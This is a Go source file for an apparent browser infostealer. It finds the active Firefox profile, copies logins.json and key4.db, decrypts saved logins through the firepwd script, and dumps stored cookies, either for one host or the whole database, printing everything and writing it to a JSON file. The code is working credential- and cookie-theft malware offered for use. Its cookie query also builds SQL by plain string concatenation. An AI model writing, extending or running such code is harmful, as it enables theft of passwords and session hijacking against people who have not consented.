package main

import (
	_ "github.com/mattn/go-sqlite3"
	"database/sql"
	"fmt"
	"os"
	"io"
	"io/ioutil"
	"strings"
	"log"
	"path/filepath"
	"encoding/json"
	"errors"
)

func getActiveProfilePath() (string, error) {
    // Get the path of Firefox profiles folder from the APPDATA environment variable
    path := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")

    // Open the Firefox profiles folder and read its directory names
    f, err := os.Open(path)
    if err != nil {
        return "", fmt.Errorf("failed to open profiles folder: %v", err)
    }
    defer f.Close()

    dirs, err := f.Readdirnames(0)
    if err != nil {
        return "", fmt.Errorf("failed to read directory names: %v", err)
    }

    // Find the directory that contains a cookies.sqlite file which indicates the active profile
    activeDir := ""
    for _, dir := range dirs {
        if _, err := os.Stat(filepath.Join(path, dir, "cookies.sqlite")); err == nil {
            activeDir = dir
            break
        }
    }

    if activeDir == "" {
        return "", errors.New("no active profile found")
    }

    // Construct the path of the active profile directory
    path = filepath.Join(path, activeDir)

    return path, nil
}

// FirefoxCrackCredentials extracts login credentials from a Firefox profile at the provided path.
// Returns a slice of Credential structs containing the host, username, and password for each login.
func FirefoxCrackCredentials(profilePath string) ([]Credential, error) {
	var credentials []Credential

	// Create directory to store profile files
	os.MkdirAll("profile", 0755)
	
	// Copy required profile files from source to destination
	srcFiles := []string{profilePath + "\\logins.json", profilePath + "\\key4.db"}
	dstFiles := []string{"./profile/logins.json", "./profile/key4.db"}
	for i, srcFile := range srcFiles {
		dstFile := dstFiles[i]
		src, err := os.Open(srcFile)
		if err != nil {
			return credentials, fmt.Errorf("failed to open %s: %s", srcFile, err)
		}
		defer src.Close()
		
		dst, err := os.Create(dstFile)
		if err != nil {
			return credentials, fmt.Errorf("failed to create %s: %s", dstFile, err)
		}
		defer dst.Close()
		
		_, err = io.Copy(dst, src)
		if err != nil {
			return credentials, fmt.Errorf("failed to copy %s to %s: %s", srcFile, dstFile, err)
		}
	}
	
	// Run firepwd to decrypt the profile, make sure you have cloned the submodule
	// And install its required dependencies
	output, err := CmdOut("py firepwd/firepwd.py -d profile/")
	if err != nil{
		return credentials, fmt.Errorf("failed to run firepwd : %s", err)
	}
	
	// Parse output to extract login credentials
	credsStart := strings.Index(output, "decrypting login/password pairs")
	if credsStart < 0 {
		// No login credentials found
		return credentials, fmt.Errorf("No credential is found")
	}
	credsStr := output[credsStart+len("decrypting login/password pairs"):]

	for _, cred := range strings.Split(credsStr, "\n") {
		cred = strings.TrimSpace(cred)
		if cred == "" {
			continue
		}
		parts := strings.Split(cred, ":b")
		values := strings.Split(parts[1], ",b")
		if len(parts) < 2 {
			continue
		}
		host := strings.TrimSpace(parts[0])
		username := strings.TrimSpace(strings.ReplaceAll(values[0], "'", ""))
		password := strings.TrimSpace(strings.ReplaceAll(values[1], "'", ""))
		credentials = append(credentials, Credential{host, username, password})
	}
	return credentials, nil
}

// FirefoxStealCookies extracts cookies with given 'host' from a Firefox cookies sqlite database
// located at 'cookiesPath'. Returns a slice of Cookie structs, and an error if there was any.
func FirefoxStealCookies(cookiesPath string, host string) ([]Cookie, error) {
	var cookies []Cookie
	db, err := sql.Open("sqlite3", cookiesPath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()

	rows, err := db.Query("select name, value, host from moz_cookies where host like '%" + host + "%'")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var name string
		var value string
		var host string
		err = rows.Scan(&name, &value, &host)
		if err != nil {
			return cookies, err
		}
		cookie := Cookie{name, value, host}
		cookies = append(cookies, cookie)
	}

	err = rows.Err()
	if err != nil {
		return cookies, err
	}

	return cookies, nil
}

// FirefoxDumpCookies, do exact same thing as function above
// Except this one retrieve all rows without 'where' condition
// Which means, this will dump the entire database into Slice of cookies
func FirefoxDumpCookies(cookiesPath string) ([]Cookie, error){
	var cookies []Cookie
	db, err := sql.Open("sqlite3", cookiesPath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()

	rows, err := db.Query("select name, value, host from moz_cookies")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var name string
		var value string
		var host string
		err = rows.Scan(&name, &value, &host)
		if err != nil {
			return cookies, err
		}
		cookie := Cookie{name, value, host}
		cookies = append(cookies, cookie)
	}

	err = rows.Err()
	if err != nil {
		return cookies, err
	}

	return cookies, nil
}

func FirefoxStealer(host string, output string, dumpAll bool, check bool){
	profilePath, err := getActiveProfilePath()
	if err != nil{
		log.Fatal(err)
		os.Exit(1)
	}
	cookiesPath := profilePath + "\\cookies.sqlite"

	fmt.Println("Opening SQL File")
	var cookies []Cookie
	var credentials []Credential
	if dumpAll{
		if len(output) == 0{
			fmt.Println("Please provide --output argument that correctly points to a valid path.")
			os.Exit(1)
		}
		cookies, err = FirefoxDumpCookies(cookiesPath)
		if err != nil{
			log.Fatal(err)
		}
	}else{
		cookies, err = FirefoxStealCookies(cookiesPath, host)
		if err != nil{
			log.Fatal(err)
		}
	}
	for _, cookie := range cookies{
		fmt.Printf("%s @ %s : %s\n", cookie.Host, cookie.Name, cookie.Value)
	}
	if check{
		creds, err := FirefoxCrackCredentials(profilePath)
		if err!= nil{
			log.Fatal(err)
		}
		for _, cred := range creds{
			fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.Host, cred.Username, cred.Password)
		}
		credentials = creds
	}

	if len(output) != 0{
		data := Data{cookies, credentials}
		jsonData, err := json.MarshalIndent(data, "", "	")
		if err != nil {
			log.Fatal("Error saving credentials into JSON file:", err)
			return
		}
		if !strings.Contains(strings.ToLower(output), "json"){
			fmt.Printf("Please provide a file that has .json extension, continue writing to %s anyway...\n", output)
		}
		fmt.Printf("Saving all result to %s\n", output)
		err = ioutil.WriteFile(output, jsonData, 0644)
		if err != nil {
			log.Fatal(err)
		}
	}
}